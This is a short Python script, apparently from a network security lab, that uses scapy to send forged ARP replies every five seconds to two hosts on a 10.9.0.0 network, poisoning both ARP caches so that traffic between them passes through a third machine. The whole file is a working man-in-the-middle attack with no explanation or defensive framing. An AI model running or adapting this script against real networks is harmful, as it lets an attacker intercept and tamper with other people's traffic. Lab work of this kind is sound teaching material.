#!/usr/bin/python3
from scapy.all import *
import time

def send_ARP_packet(mac_dst, mac_src, ip_dst, ip_src):
	E = Ether(dst=mac_dst, src=mac_src)
	A = ARP(op=2,hwsrc=mac_src,psrc=ip_src, hwdst=mac_dst, pdst=ip_dst)
	pkt = E/A
	sendp(pkt)

state = True

print("Poisoning both machines..........")

while state:
	send_ARP_packet('02:42:0a:09:00:05', '02:42:0a:09:00:69', '10.9.0.5','10.9.0.6')#A->M->B
	send_ARP_packet('02:42:0a:09:00:06','02:42:0a:09:00:69','10.9.0.6','10.9.0.5')  #B->M->A
	time.sleep(5)
